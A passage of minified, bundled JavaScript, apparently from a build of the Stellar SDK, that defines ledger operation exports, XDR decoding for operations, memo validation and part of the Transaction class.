        var j = requireCreate_passive_sell_offer$1();
        Object.defineProperty(_, "createPassiveSellOffer", {
            enumerable: !0,
            get: function() {
                return j.createPassiveSellOffer
            }
        });
        var O = requireAccount_merge$1();
        Object.defineProperty(_, "accountMerge", {
            enumerable: !0,
            get: function() {
                return O.accountMerge
            }
        });
        var x = requireAllow_trust$1();
        Object.defineProperty(_, "allowTrust", {
            enumerable: !0,
            get: function() {
                return x.allowTrust
            }
        });
        var w = requireBump_sequence$1();
        Object.defineProperty(_, "bumpSequence", {
            enumerable: !0,
            get: function() {
                return w.bumpSequence
            }
        });
        var b = requireChange_trust$1();
        Object.defineProperty(_, "changeTrust", {
            enumerable: !0,
            get: function() {
                return b.changeTrust
            }
        });
        var X = requireCreate_account$1();
        Object.defineProperty(_, "createAccount", {
            enumerable: !0,
            get: function() {
                return X.createAccount
            }
        });
        var Y = requireCreate_claimable_balance$1();
        Object.defineProperty(_, "createClaimableBalance", {
            enumerable: !0,
            get: function() {
                return Y.createClaimableBalance
            }
        });
        var F = requireClaim_claimable_balance$1();
        Object.defineProperty(_, "claimClaimableBalance", {
            enumerable: !0,
            get: function() {
                return F.claimClaimableBalance
            }
        });
        var V = requireClawback_claimable_balance$1();
        Object.defineProperty(_, "clawbackClaimableBalance", {
            enumerable: !0,
            get: function() {
                return V.clawbackClaimableBalance
            }
        });
        var K = requireInflation$1();
        Object.defineProperty(_, "inflation", {
            enumerable: !0,
            get: function() {
                return K.inflation
            }
        });
        var Q = requireManage_data$1();
        Object.defineProperty(_, "manageData", {
            enumerable: !0,
            get: function() {
                return Q.manageData
            }
        });
        var ee = requireManage_buy_offer$1();
        Object.defineProperty(_, "manageBuyOffer", {
            enumerable: !0,
            get: function() {
                return ee.manageBuyOffer
            }
        });
        var ae = requirePath_payment_strict_receive$1();
        Object.defineProperty(_, "pathPaymentStrictReceive", {
            enumerable: !0,
            get: function() {
                return ae.pathPaymentStrictReceive
            }
        });
        var ne = requirePath_payment_strict_send$1();
        Object.defineProperty(_, "pathPaymentStrictSend", {
            enumerable: !0,
            get: function() {
                return ne.pathPaymentStrictSend
            }
        });
        var oe = requirePayment$1();
        Object.defineProperty(_, "payment", {
            enumerable: !0,
            get: function() {
                return oe.payment
            }
        });
        var ue = requireSet_options$1();
        Object.defineProperty(_, "setOptions", {
            enumerable: !0,
            get: function() {
                return ue.setOptions
            }
        });
        var fe = requireBegin_sponsoring_future_reserves$1();
        Object.defineProperty(_, "beginSponsoringFutureReserves", {
            enumerable: !0,
            get: function() {
                return fe.beginSponsoringFutureReserves
            }
        });
        var he = requireEnd_sponsoring_future_reserves$1();
        Object.defineProperty(_, "endSponsoringFutureReserves", {
            enumerable: !0,
            get: function() {
                return he.endSponsoringFutureReserves
            }
        });
        var pe = requireRevoke_sponsorship$1();
        Object.defineProperty(_, "revokeAccountSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeAccountSponsorship
            }
        }),
        Object.defineProperty(_, "revokeTrustlineSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeTrustlineSponsorship
            }
        }),
        Object.defineProperty(_, "revokeOfferSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeOfferSponsorship
            }
        }),
        Object.defineProperty(_, "revokeDataSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeDataSponsorship
            }
        }),
        Object.defineProperty(_, "revokeClaimableBalanceSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeClaimableBalanceSponsorship
            }
        }),
        Object.defineProperty(_, "revokeLiquidityPoolSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeLiquidityPoolSponsorship
            }
        }),
        Object.defineProperty(_, "revokeSignerSponsorship", {
            enumerable: !0,
            get: function() {
                return pe.revokeSignerSponsorship
            }
        });
        var ye = requireClawback$1();
        Object.defineProperty(_, "clawback", {
            enumerable: !0,
            get: function() {
                return ye.clawback
            }
        });
        var be = requireSet_trustline_flags$1();
        Object.defineProperty(_, "setTrustLineFlags", {
            enumerable: !0,
            get: function() {
                return be.setTrustLineFlags
            }
        });
        var xe = requireLiquidity_pool_deposit$1();
        Object.defineProperty(_, "liquidityPoolDeposit", {
            enumerable: !0,
            get: function() {
                return xe.liquidityPoolDeposit
            }
        });
        var Ae = requireLiquidity_pool_withdraw$1();
        Object.defineProperty(_, "liquidityPoolWithdraw", {
            enumerable: !0,
            get: function() {
                return Ae.liquidityPoolWithdraw
            }
        })
    }(operations$1)),
    operations$1
}
var hasRequiredOperation$1;
function requireOperation$1() {
    if (hasRequiredOperation$1)
        return operation$1;
    hasRequiredOperation$1 = 1,
    Object.defineProperty(operation$1, "__esModule", {
        value: !0
    }),
    operation$1.Operation = operation$1.AuthClawbackEnabledFlag = operation$1.AuthImmutableFlag = operation$1.AuthRevocableFlag = operation$1.AuthRequiredFlag = void 0;
    var _ = function() {
        function de(re, $) {
            for (var ie = 0; ie < $.length; ie++) {
                var ve = $[ie];
                ve.enumerable = ve.enumerable || !1,
                ve.configurable = !0,
                "value"in ve && (ve.writable = !0),
                Object.defineProperty(re, ve.key, ve)
            }
        }
        return function(re, $, ie) {
            return $ && de(re.prototype, $),
            ie && de(re, ie),
            re
        }
    }()
      , M = requireLib$4()
      , j = requireBignumber$2()
      , O = Be(j)
      , x = requireTrimEnd()
      , w = Be(x)
      , b = requireIsUndefined()
      , X = Be(b)
      , Y = requireIsString()
      , F = Be(Y)
      , V = requireIsNumber()
      , K = Be(V)
      , Q = require_isFinite()
      , ee = Be(Q)
      , ae = requireContinued_fraction$1()
      , ne = requireAsset$1()
      , oe = requireLiquidity_pool_asset$1()
      , ue = requireClaimant$1()
      , fe = requireStrkey$1()
      , he = requireLiquidity_pool_id$1()
      , pe = requireStellarXdr_generated()
      , ye = Be(pe)
      , be = requireOperations$1()
      , xe = Ee(be)
      , Ae = requireDecode_encode_muxed_account$1();
    function Ee(de) {
        if (de && de.__esModule)
            return de;
        var re = {};
        if (de != null)
            for (var $ in de)
                Object.prototype.hasOwnProperty.call(de, $) && (re[$] = de[$]);
        return re.default = de,
        re
    }
    function Be(de) {
        return de && de.__esModule ? de : {
            default: de
        }
    }
    function ce(de, re) {
        if (!(de instanceof re))
            throw new TypeError("Cannot call a class as a function")
    }
    var q = 1e7
      , L = "9223372036854775807";
    operation$1.AuthRequiredFlag = 1,
    operation$1.AuthRevocableFlag = 2,
    operation$1.AuthImmutableFlag = 4,
    operation$1.AuthClawbackEnabledFlag = 8;
    var U = operation$1.Operation = function() {
        function de() {
            ce(this, de)
        }
        return _(de, null, [{
            key: "setSourceAccount",
            value: function($, ie) {
                if (ie.source)
                    try {
                        $.sourceAccount = (0,
                        Ae.decodeAddressToMuxedAccount)(ie.source, ie.withMuxing)
                    } catch {
                        throw new Error("Source address is invalid")
                    }
            }
        }, {
            key: "fromXDRObject",
            value: function($, ie) {
                var ve = {};
                $.sourceAccount() && (ve.source = (0,
                Ae.encodeMuxedAccountToAddress)($.sourceAccount(), ie));
                var ge = $.body().value()
                  , Re = $.body().switch().name;
                switch (Re) {
                case "createAccount":
                    {
                        ve.type = "createAccount",
                        ve.destination = se(ge.destination()),
                        ve.startingBalance = this._fromXDRAmount(ge.startingBalance());
                        break
                    }
                case "payment":
                    {
                        ve.type = "payment",
                        ve.destination = (0,
                        Ae.encodeMuxedAccountToAddress)(ge.destination(), ie),
                        ve.asset = ne.Asset.fromOperation(ge.asset()),
                        ve.amount = this._fromXDRAmount(ge.amount());
                        break
                    }
                case "pathPaymentStrictReceive":
                    {
                        ve.type = "pathPaymentStrictReceive",
                        ve.sendAsset = ne.Asset.fromOperation(ge.sendAsset()),
                        ve.sendMax = this._fromXDRAmount(ge.sendMax()),
                        ve.destination = (0,
                        Ae.encodeMuxedAccountToAddress)(ge.destination(), ie),
                        ve.destAsset = ne.Asset.fromOperation(ge.destAsset()),
                        ve.destAmount = this._fromXDRAmount(ge.destAmount()),
                        ve.path = [];
                        var Pe = ge.path();
                        Object.keys(Pe).forEach(function(Ve) {
                            ve.path.push(ne.Asset.fromOperation(Pe[Ve]))
                        });
                        break
                    }
                case "pathPaymentStrictSend":
                    {
                        ve.type = "pathPaymentStrictSend",
                        ve.sendAsset = ne.Asset.fromOperation(ge.sendAsset()),
                        ve.sendAmount = this._fromXDRAmount(ge.sendAmount()),
                        ve.destination = (0,
                        Ae.encodeMuxedAccountToAddress)(ge.destination(), ie),
                        ve.destAsset = ne.Asset.fromOperation(ge.destAsset()),
                        ve.destMin = this._fromXDRAmount(ge.destMin()),
                        ve.path = [];
                        var Ie = ge.path();
                        Object.keys(Ie).forEach(function(Ve) {
                            ve.path.push(ne.Asset.fromOperation(Ie[Ve]))
                        });
                        break
                    }
                case "changeTrust":
                    {
                        switch (ve.type = "changeTrust",
                        ge.line().switch()) {
                        case ye.default.AssetType.assetTypePoolShare():
                            ve.line = oe.LiquidityPoolAsset.fromOperation(ge.line());
                            break;
                        default:
                            ve.line = ne.Asset.fromOperation(ge.line());
                            break
                        }
                        ve.limit = this._fromXDRAmount(ge.limit());
                        break
                    }
                case "allowTrust":
                    {
                        ve.type = "allowTrust",
                        ve.trustor = se(ge.trustor()),
                        ve.assetCode = ge.asset().value().toString(),
                        ve.assetCode = (0,
                        w.default)(ve.assetCode, "\0"),
                        ve.authorize = ge.authorize();
                        break
                    }
                case "setOptions":
                    {
                        if (ve.type = "setOptions",
                        ge.inflationDest() && (ve.inflationDest = se(ge.inflationDest())),
                        ve.clearFlags = ge.clearFlags(),
                        ve.setFlags = ge.setFlags(),
                        ve.masterWeight = ge.masterWeight(),
                        ve.lowThreshold = ge.lowThreshold(),
                        ve.medThreshold = ge.medThreshold(),
                        ve.highThreshold = ge.highThreshold(),
                        ve.homeDomain = ge.homeDomain() !== void 0 ? ge.homeDomain().toString("ascii") : void 0,
                        ge.signer()) {
                            var Te = {}
                              , Le = ge.signer().key().arm();
                            Le === "ed25519" ? Te.ed25519PublicKey = se(ge.signer().key()) : Le === "preAuthTx" ? Te.preAuthTx = ge.signer().key().preAuthTx() : Le === "hashX" && (Te.sha256Hash = ge.signer().key().hashX()),
                            Te.weight = ge.signer().weight(),
                            ve.signer = Te
                        }
                        break
                    }
                case "manageOffer":
                case "manageSellOffer":
                    {
                        ve.type = "manageSellOffer",
                        ve.selling = ne.Asset.fromOperation(ge.selling()),
                        ve.buying = ne.Asset.fromOperation(ge.buying()),
                        ve.amount = this._fromXDRAmount(ge.amount()),
                        ve.price = this._fromXDRPrice(ge.price()),
                        ve.offerId = ge.offerId().toString();
                        break
                    }
                case "manageBuyOffer":
                    {
                        ve.type = "manageBuyOffer",
                        ve.selling = ne.Asset.fromOperation(ge.selling()),
                        ve.buying = ne.Asset.fromOperation(ge.buying()),
                        ve.buyAmount = this._fromXDRAmount(ge.buyAmount()),
                        ve.price = this._fromXDRPrice(ge.price()),
                        ve.offerId = ge.offerId().toString();
                        break
                    }
                case "createPassiveOffer":
                case "createPassiveSellOffer":
                    {
                        ve.type = "createPassiveSellOffer",
                        ve.selling = ne.Asset.fromOperation(ge.selling()),
                        ve.buying = ne.Asset.fromOperation(ge.buying()),
                        ve.amount = this._fromXDRAmount(ge.amount()),
                        ve.price = this._fromXDRPrice(ge.price());
                        break
                    }
                case "accountMerge":
                    {
                        ve.type = "accountMerge",
                        ve.destination = (0,
                        Ae.encodeMuxedAccountToAddress)(ge, ie);
                        break
                    }
                case "manageData":
                    {
                        ve.type = "manageData",
                        ve.name = ge.dataName().toString("ascii"),
                        ve.value = ge.dataValue();
                        break
                    }
                case "inflation":
                    {
                        ve.type = "inflation";
                        break
                    }
                case "bumpSequence":
                    {
                        ve.type = "bumpSequence",
                        ve.bumpTo = ge.bumpTo().toString();
                        break
                    }
                case "createClaimableBalance":
                    {
                        ve.type = "createClaimableBalance",
                        ve.asset = ne.Asset.fromOperation(ge.asset()),
                        ve.amount = this._fromXDRAmount(ge.amount()),
                        ve.claimants = [],
                        ge.claimants().forEach(function(Ve) {
                            ve.claimants.push(ue.Claimant.fromXDR(Ve))
                        });
                        break
                    }
                case "claimClaimableBalance":
                    {
                        ve.type = "claimClaimableBalance",
                        ve.balanceId = ge.toXDR("hex");
                        break
                    }
                case "beginSponsoringFutureReserves":
                    {
                        ve.type = "beginSponsoringFutureReserves",
                        ve.sponsoredId = se(ge.sponsoredId());
                        break
                    }
                case "endSponsoringFutureReserves":
                    {
                        ve.type = "endSponsoringFutureReserves";
                        break
                    }
                case "revokeSponsorship":
                    {
                        Z(ge, ve);
                        break
                    }
                case "clawback":
                    {
                        ve.type = "clawback",
                        ve.amount = this._fromXDRAmount(ge.amount()),
                        ve.from = (0,
                        Ae.encodeMuxedAccountToAddress)(ge.from()),
                        ve.asset = ne.Asset.fromOperation(ge.asset());
                        break
                    }
                case "clawbackClaimableBalance":
                    {
                        ve.type = "clawbackClaimableBalance",
                        ve.balanceId = ge.toXDR("hex");
                        break
                    }
                case "setTrustLineFlags":
                    {
                        ve.type = "setTrustLineFlags",
                        ve.asset = ne.Asset.fromOperation(ge.asset()),
                        ve.trustor = se(ge.trustor());
                        var Ze = ge.clearFlags()
                          , $e = ge.setFlags()
                          , Ne = {
                            authorized: ye.default.TrustLineFlags.authorizedFlag(),
                            authorizedToMaintainLiabilities: ye.default.TrustLineFlags.authorizedToMaintainLiabilitiesFlag(),
                            clawbackEnabled: ye.default.TrustLineFlags.trustlineClawbackEnabledFlag()
                        }
                          , qe = function(lt) {
                            var nt = Ne[lt].value;
                            if ($e & nt)
                                return !0;
                            if (Ze & nt)
                                return !1
                        };
                        ve.flags = {},
                        Object.keys(Ne).forEach(function(Ve) {
                            ve.flags[Ve] = qe(Ve)
                        });
                        break
                    }
                case "liquidityPoolDeposit":
                    {
                        ve.type = "liquidityPoolDeposit",
                        ve.liquidityPoolId = ge.liquidityPoolId().toString("hex"),
                        ve.maxAmountA = this._fromXDRAmount(ge.maxAmountA()),
                        ve.maxAmountB = this._fromXDRAmount(ge.maxAmountB()),
                        ve.minPrice = this._fromXDRPrice(ge.minPrice()),
                        ve.maxPrice = this._fromXDRPrice(ge.maxPrice());
                        break
                    }
                case "liquidityPoolWithdraw":
                    {
                        ve.type = "liquidityPoolWithdraw",
                        ve.liquidityPoolId = ge.liquidityPoolId().toString("hex"),
                        ve.amount = this._fromXDRAmount(ge.amount()),
                        ve.minAmountA = this._fromXDRAmount(ge.minAmountA()),
                        ve.minAmountB = this._fromXDRAmount(ge.minAmountB());
                        break
                    }
                default:
                    throw new Error("Unknown operation: " + Re)
                }
                return ve
            }
        }, {
            key: "isValidAmount",
            value: function($) {
                var ie = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1;
                if (!(0,
                F.default)($))
                    return !1;
                var ve = void 0;
                try {
                    ve = new O.default($)
                } catch {
                    return !1
                }
                return !(!ie && ve.isZero() || ve.isNegative() || ve.times(q).greaterThan(new O.default(L).toString()) || ve.decimalPlaces() > 7 || ve.isNaN() || !ve.isFinite())
            }
        }, {
            key: "constructAmountRequirementsError",
            value: function($) {
                return $ + " argument must be of type String, represent a positive number and have at most 7 digits after the decimal"
            }
        }, {
            key: "_checkUnsignedIntValue",
            value: function($, ie) {
                var ve = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : null;
                if (!(0,
                X.default)(ie))
                    switch ((0,
                    F.default)(ie) && (ie = parseFloat(ie)),
                    !0) {
                    case (!(0,
                    K.default)(ie) || !(0,
                    ee.default)(ie) || ie % 1 !== 0):
                        throw new Error($ + " value is invalid");
                    case ie < 0:
                        throw new Error($ + " value must be unsigned");
                    case (!ve || ve && ve(ie, $)):
                        return ie;
                    default:
                        throw new Error($ + " value is invalid")
                    }
            }
        }, {
            key: "_toXDRAmount",
            value: function($) {
                var ie = new O.default($).mul(q);
                return M.Hyper.fromString(ie.toString())
            }
        }, {
            key: "_fromXDRAmount",
            value: function($) {
                return new O.default($).div(q).toFixed(7)
            }
        }, {
            key: "_fromXDRPrice",
            value: function($) {
                var ie = new O.default($.n());
                return ie.div(new O.default($.d())).toString()
            }
        }, {
            key: "_toXDRPrice",
            value: function($) {
                var ie = void 0;
                if ($.n && $.d)
                    ie = new ye.default.Price($);
                else {
                    $ = new O.default($);
                    var ve = (0,
                    ae.best_r)($);
                    ie = new ye.default.Price({
                        n: parseInt(ve[0], 10),
                        d: parseInt(ve[1], 10)
                    })
                }
                if (ie.n() < 0 || ie.d() < 0)
                    throw new Error("price must be positive");
                return ie
            }
        }]),
        de
    }();
    function Z(de, re) {
        switch (de.switch().name) {
        case "revokeSponsorshipLedgerEntry":
            {
                var $ = de.ledgerKey();
                switch ($.switch().name) {
                case ye.default.LedgerEntryType.account().name:
                    {
                        re.type = "revokeAccountSponsorship",
                        re.account = se($.account().accountId());
                        break
                    }
                case ye.default.LedgerEntryType.trustline().name:
                    {
                        re.type = "revokeTrustlineSponsorship",
                        re.account = se($.trustLine().accountId());
                        var ie = $.trustLine().asset();
                        switch (ie.switch()) {
                        case ye.default.AssetType.assetTypePoolShare():
                            re.asset = he.LiquidityPoolId.fromOperation(ie);
                            break;
                        default:
                            re.asset = ne.Asset.fromOperation(ie);
                            break
                        }
                        break
                    }
                case ye.default.LedgerEntryType.offer().name:
                    {
                        re.type = "revokeOfferSponsorship",
                        re.seller = se($.offer().sellerId()),
                        re.offerId = $.offer().offerId().toString();
                        break
                    }
                case ye.default.LedgerEntryType.data().name:
                    {
                        re.type = "revokeDataSponsorship",
                        re.account = se($.data().accountId()),
                        re.name = $.data().dataName().toString("ascii");
                        break
                    }
                case ye.default.LedgerEntryType.claimableBalance().name:
                    {
                        re.type = "revokeClaimableBalanceSponsorship",
                        re.balanceId = $.claimableBalance().balanceId().toXDR("hex");
                        break
                    }
                case ye.default.LedgerEntryType.liquidityPool().name:
                    {
                        re.type = "revokeLiquidityPoolSponsorship",
                        re.liquidityPoolId = $.liquidityPool().liquidityPoolId().toString("hex");
                        break
                    }
                default:
                    throw new Error("Unknown ledgerKey: " + de.switch().name)
                }
                break
            }
        case "revokeSponsorshipSigner":
            {
                re.type = "revokeSignerSponsorship",
                re.account = se(de.signer().accountId()),
                re.signer = te(de.signer().signerKey());
                break
            }
        default:
            throw new Error("Unknown revokeSponsorship: " + de.switch().name)
        }
    }
    function te(de) {
        var re = {};
        switch (de.switch().name) {
        case ye.default.SignerKeyType.signerKeyTypeEd25519().name:
            {
                re.ed25519PublicKey = fe.StrKey.encodeEd25519PublicKey(de.ed25519());
                break
            }
        case ye.default.SignerKeyType.signerKeyTypePreAuthTx().name:
            {
                re.preAuthTx = de.preAuthTx().toString("hex");
                break
            }
        case ye.default.SignerKeyType.signerKeyTypeHashX().name:
            {
                re.sha256Hash = de.hashX().toString("hex");
                break
            }
        default:
            throw new Error("Unknown signerKey: " + de.switch().name)
        }
        return re
    }
    function se(de) {
        return fe.StrKey.encodeEd25519PublicKey(de.ed25519())
    }
    return U.accountMerge = xe.accountMerge,
    U.allowTrust = xe.allowTrust,
    U.bumpSequence = xe.bumpSequence,
    U.changeTrust = xe.changeTrust,
    U.createAccount = xe.createAccount,
    U.createClaimableBalance = xe.createClaimableBalance,
    U.claimClaimableBalance = xe.claimClaimableBalance,
    U.clawbackClaimableBalance = xe.clawbackClaimableBalance,
    U.createPassiveSellOffer = xe.createPassiveSellOffer,
    U.inflation = xe.inflation,
    U.manageData = xe.manageData,
    U.manageSellOffer = xe.manageSellOffer,
    U.manageBuyOffer = xe.manageBuyOffer,
    U.pathPaymentStrictReceive = xe.pathPaymentStrictReceive,
    U.pathPaymentStrictSend = xe.pathPaymentStrictSend,
    U.payment = xe.payment,
    U.setOptions = xe.setOptions,
    U.beginSponsoringFutureReserves = xe.beginSponsoringFutureReserves,
    U.endSponsoringFutureReserves = xe.endSponsoringFutureReserves,
    U.revokeAccountSponsorship = xe.revokeAccountSponsorship,
    U.revokeTrustlineSponsorship = xe.revokeTrustlineSponsorship,
    U.revokeOfferSponsorship = xe.revokeOfferSponsorship,
    U.revokeDataSponsorship = xe.revokeDataSponsorship,
    U.revokeClaimableBalanceSponsorship = xe.revokeClaimableBalanceSponsorship,
    U.revokeLiquidityPoolSponsorship = xe.revokeLiquidityPoolSponsorship,
    U.revokeSignerSponsorship = xe.revokeSignerSponsorship,
    U.clawback = xe.clawback,
    U.setTrustLineFlags = xe.setTrustLineFlags,
    U.liquidityPoolDeposit = xe.liquidityPoolDeposit,
    U.liquidityPoolWithdraw = xe.liquidityPoolWithdraw,
    operation$1
}
var memo$1 = {}, hasRequiredMemo$1;
function requireMemo$1() {
    if (hasRequiredMemo$1)
        return memo$1;
    hasRequiredMemo$1 = 1,
    Object.defineProperty(memo$1, "__esModule", {
        value: !0
    }),
    memo$1.Memo = memo$1.MemoReturn = memo$1.MemoHash = memo$1.MemoText = memo$1.MemoID = memo$1.MemoNone = void 0;
    var _ = function() {
        function pe(ye, be) {
            for (var xe = 0; xe < be.length; xe++) {
                var Ae = be[xe];
                Ae.enumerable = Ae.enumerable || !1,
                Ae.configurable = !0,
                "value"in Ae && (Ae.writable = !0),
                Object.defineProperty(ye, Ae.key, Ae)
            }
        }
        return function(ye, be, xe) {
            return be && pe(ye.prototype, be),
            xe && pe(ye, xe),
            ye
        }
    }()
      , M = requireIsUndefined()
      , j = Q(M)
      , O = requireIsString()
      , x = Q(O)
      , w = requireClone()
      , b = Q(w)
      , X = requireLib$4()
      , Y = requireBignumber$2()
      , F = Q(Y)
      , V = requireStellarXdr_generated()
      , K = Q(V);
    function Q(pe) {
        return pe && pe.__esModule ? pe : {
            default: pe
        }
    }
    function ee(pe, ye) {
        if (!(pe instanceof ye))
            throw new TypeError("Cannot call a class as a function")
    }
    var ae = memo$1.MemoNone = "none"
      , ne = memo$1.MemoID = "id"
      , oe = memo$1.MemoText = "text"
      , ue = memo$1.MemoHash = "hash"
      , fe = memo$1.MemoReturn = "return"
      , he = function() {
        function pe(ye) {
            var be = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
            switch (ee(this, pe),
            this._type = ye,
            this._value = be,
            this._type) {
            case ae:
                break;
            case ne:
                pe._validateIdValue(be);
                break;
            case oe:
                pe._validateTextValue(be);
                break;
            case ue:
            case fe:
                pe._validateHashValue(be),
                (0,
                x.default)(be) && (this._value = Buffer.from(be, "hex"));
                break;
            default:
                throw new Error("Invalid memo type")
            }
        }
        return _(pe, [{
            key: "toXDRObject",
            value: function() {
                switch (this._type) {
                case ae:
                    return K.default.Memo.memoNone();
                case ne:
                    return K.default.Memo.memoId(X.UnsignedHyper.fromString(this._value));
                case oe:
                    return K.default.Memo.memoText(this._value);
                case ue:
                    return K.default.Memo.memoHash(this._value);
                case fe:
                    return K.default.Memo.memoReturn(this._value);
                default:
                    return null
                }
            }
        }, {
            key: "type",
            get: function() {
                return (0,
                b.default)(this._type)
            },
            set: function(be) {
                throw new Error("Memo is immutable")
            }
        }, {
            key: "value",
            get: function() {
                switch (this._type) {
                case ae:
                    return null;
                case ne:
                case oe:
                    return (0,
                    b.default)(this._value);
                case ue:
                case fe:
                    return Buffer.from(this._value);
                default:
                    throw new Error("Invalid memo type")
                }
            },
            set: function(be) {
                throw new Error("Memo is immutable")
            }
        }], [{
            key: "_validateIdValue",
            value: function(be) {
                var xe = new Error("Expects a int64 as a string. Got " + be);
                if (!(0,
                x.default)(be))
                    throw xe;
                var Ae = void 0;
                try {
                    Ae = new F.default(be)
                } catch {
                    throw xe
                }
                if (!Ae.isFinite() || Ae.isNaN())
                    throw xe
            }
        }, {
            key: "_validateTextValue",
            value: function(be) {
                if (!K.default.Memo.armTypeForArm("text").isValid(be))
                    throw new Error("Expects string, array or buffer, max 28 bytes")
            }
        }, {
            key: "_validateHashValue",
            value: function(be) {
                var xe = new Error("Expects a 32 byte hash value or hex encoded string. Got " + be);
                if (be === null || (0,
                j.default)(be))
                    throw xe;
                var Ae = void 0;
                if ((0,
                x.default)(be)) {
                    if (!/^[0-9A-Fa-f]{64}$/g.test(be))
                        throw xe;
                    Ae = Buffer.from(be, "hex")
                } else if (Buffer.isBuffer(be))
                    Ae = Buffer.from(be);
                else
                    throw xe;
                if (!Ae.length || Ae.length !== 32)
                    throw xe
            }
        }, {
            key: "none",
            value: function() {
                return new pe(ae)
            }
        }, {
            key: "text",
            value: function(be) {
                return new pe(oe,be)
            }
        }, {
            key: "id",
            value: function(be) {
                return new pe(ne,be)
            }
        }, {
            key: "hash",
            value: function(be) {
                return new pe(ue,be)
            }
        }, {
            key: "return",
            value: function(be) {
                return new pe(fe,be)
            }
        }, {
            key: "fromXDRObject",
            value: function(be) {
                switch (be.arm()) {
                case "id":
                    return pe.id(be.value().toString());
                case "text":
                    return pe.text(be.value());
                case "hash":
                    return pe.hash(be.value());
                case "retHash":
                    return pe.return(be.value())
                }
                if (typeof be.value() > "u")
                    return pe.none();
                throw new Error("Unknown type")
            }
        }]),
        pe
    }();
    return memo$1.Memo = he,
    memo$1
}
var hasRequiredTransaction$1;
function requireTransaction$1() {
    if (hasRequiredTransaction$1)
        return transaction$1;
    hasRequiredTransaction$1 = 1,
    Object.defineProperty(transaction$1, "__esModule", {
        value: !0
    }),
    transaction$1.Transaction = void 0;
    var _ = function() {
        function ne(oe, ue) {
            for (var fe = 0; fe < ue.length; fe++) {
                var he = ue[fe];
                he.enumerable = he.enumerable || !1,
                he.configurable = !0,
                "value"in he && (he.writable = !0),
                Object.defineProperty(oe, he.key, he)
            }
        }
        return function(oe, ue, fe) {
            return ue && ne(oe.prototype, ue),
            fe && ne(oe, fe),
            oe
        }
    }()
      , M = requireMap()
      , j = K(M)
      , O = requireStellarXdr_generated()
      , x = K(O)
      , w = requireHashing$1()
      , b = requireStrkey$1()
      , X = requireOperation$1()
      , Y = requireMemo$1()
      , F = requireTransaction_base$1()
      , V = requireDecode_encode_muxed_account$1();
    function K(ne) {
        return ne && ne.__esModule ? ne : {
            default: ne
        }
    }
    function Q(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function ee(ne, oe) {
        if (!ne)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return oe && (typeof oe == "object" || typeof oe == "function") ? oe : ne
    }
    function ae(ne, oe) {
        if (typeof oe != "function" && oe !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof oe);
        ne.prototype = Object.create(oe && oe.prototype, {
            constructor: {
                value: ne,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        oe && (Object.setPrototypeOf ? Object.setPrototypeOf(ne, oe) : ne.__proto__ = oe)
    }
    return transaction$1.Transaction = function(ne) {
        ae(oe, ne);
        function oe(ue, fe, he) {
            if (Q(this, oe),
            typeof ue == "string") {
                var pe = Buffer.from(ue, "base64");
                ue = x.default.TransactionEnvelope.fromXDR(pe)
            }
            var ye = ue.switch();
            if (!(ye === x.default.EnvelopeType.envelopeTypeTxV0() || ye === x.default.EnvelopeType.envelopeTypeTx()))
                throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxV0 or envelopeTypeTx but received an " + ye.name + ".");
            var be = ue.value()
              , xe = be.tx()
              , Ae = xe.fee().toString()
              , Ee = (be.signatures() || []).slice()
              , Be = ee(this, (oe.__proto__ || Object.getPrototypeOf(oe)).call(this, xe, Ee, Ae, fe));
            switch (Be._envelopeType = ye,
            Be._memo = xe.memo(),
            Be._sequence = xe.seqNum().toString(),
            Be._envelopeType) {
            case x.default.EnvelopeType.envelopeTypeTxV0():
                Be._source = b.StrKey.encodeEd25519PublicKey(Be.tx.sourceAccountEd25519());
                break;
            default:
                Be._source = (0,
                V.encodeMuxedAccountToAddress)(Be.tx.sourceAccount(), he);
                break
            }
            var ce = xe.timeBounds();
            ce && (Be._timeBounds = {
                minTime: ce.minTime().toString(),
                maxTime: ce.maxTime().toString()
            });
            var q = xe.operations() || [];
            return Be._operations = (0,
            j.default)(q, function(L) {
                return X.Operation.fromXDRObject(L, he)
            }),
            Be
        }
        return _(oe, [{
            key: "signatureBase",
            value: function() {
                var fe = this.tx;
                this._envelopeType === x.default.EnvelopeType.envelopeTypeTxV0() && (fe = x.default.Transaction.fromXDR(Buffer.concat([x.default.PublicKeyType.publicKeyTypeEd25519().toXDR(), fe.toXDR()])));
                var he = new x.default.TransactionSignaturePayloadTaggedTransaction.envelopeTypeTx(fe)
                  , pe = new x.default.TransactionSignaturePayload({
                    networkId: x.default.Hash.fromXDR((0,
                    w.hash)(this.networkPassphrase)),
                    taggedTransaction: he
                });
                return pe.toXDR()
            }
        }, {
            key: "toEnvelope",
            value: function() {
                var fe = this.tx.toXDR()
                  , he = this.signatures.slice()
                  , pe = void 0;
                switch (this._envelopeType) {
                case x.default.EnvelopeType.envelopeTypeTxV0():
                    pe = new x.default.TransactionEnvelope.envelopeTypeTxV0(new x.default.TransactionV0Envelope({
                        tx: x.default.TransactionV0.fromXDR(fe),
                        signatures: he
                    }));
                    break;
                case x.default.EnvelopeType.envelopeTypeTx():
                    pe = new x.default.TransactionEnvelope.envelopeTypeTx(new x.default.TransactionV1Envelope({
                        tx: x.default.Transaction.fromXDR(fe),
                        signatures: he
                    }));
                    break;
                default:
                    throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxV0 or envelopeTypeTx but received an " + this._envelopeType.name + ".")
                }
                return pe
            }
        }, {
            key: "timeBounds",
            get: function() {
                return this._timeBounds
            },
            set: function(fe) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "sequence",
            get: function() {
                return this._sequence
            },
            set: function(fe) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "source",
            get: function() {
                return this._source
            },
            set: function(fe) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "operations",
            get: function() {
                return this._operations
            },
            set: function(fe) {
